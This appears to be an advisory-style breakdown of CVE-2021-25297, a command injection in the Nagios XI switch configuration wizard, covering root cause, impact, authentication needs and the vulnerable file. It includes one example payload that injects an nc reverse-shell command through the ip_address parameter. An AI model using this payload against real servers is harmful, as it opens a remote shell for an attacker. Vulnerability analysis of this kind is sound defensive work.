Based on the provided content, here's a breakdown of the vulnerability information for CVE-2021-25297:

**Root Cause of Vulnerability:**
- The vulnerability stems from the lack of sanitization of user-controlled input, specifically the `ip_address` parameter, when constructing a filename and executing a command via the `exec()` function in PHP.

**Weaknesses/Vulnerabilities Present:**
- **Command Injection:** The primary vulnerability is command injection, where an attacker can inject arbitrary shell commands into a command being executed by the server due to the lack of input sanitization.
- **Insufficient Input Validation:** The application fails to validate or sanitize the `ip_address` parameter before using it in a command, which can be exploited by an attacker to inject malicious shell commands.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** Successful exploitation allows an attacker to execute arbitrary code on the server with the privileges of the web server user (typically `apache`).
- **Complete System Compromise:** By gaining code execution, the attacker can potentially escalate privileges and compromise the entire system.
- **Data Breach and Loss:** The attacker may gain access to sensitive data, modify or delete data, or disrupt services.

**Attack Vectors:**
- **HTTP Request:** The vulnerability is triggered through a crafted HTTP request to the Nagios XI web interface, specifically when using the "switch" configuration wizard.
- **URL Parameter Manipulation:** The attacker injects malicious shell commands by modifying the `ip_address` URL parameter.

**Required Attacker Capabilities/Position:**
- **Authentication:** A valid username/password pair is required to exploit this vulnerability. The attacker needs to be authenticated to the NagiosXI interface to access the vulnerable configuration wizard.
- **Network Access:** The attacker needs network access to the Nagios XI server to send the malicious HTTP request.

**Technical Details:**
- The vulnerability occurs in the file `/usr/local/nagiosxi/html/includes/configwizards/switch/switch.inc.php`.
- The vulnerable code constructs file paths and executes the `sed` command using `exec()`. The `ip_address` parameter is used to construct the file path.
- An attacker can inject shell commands by providing an `ip_address` value that contains shell metacharacters (e.g., `';'`, `|`).
- For example:
`ip_address=127.0.0.1; nc -e /bin/sh 127.0.0.1 4445;`

**Additional Notes:**
- The provided fastly.com content confirms that the vulnerability affects NagiosXI versions 5.5.6 to 5.7.5.
- The github.com content shows a working POC using `nc` to obtain a reverse shell.
- The `sed` command is used to add meta information to the generated config file, and the injected commands are executed within this context.
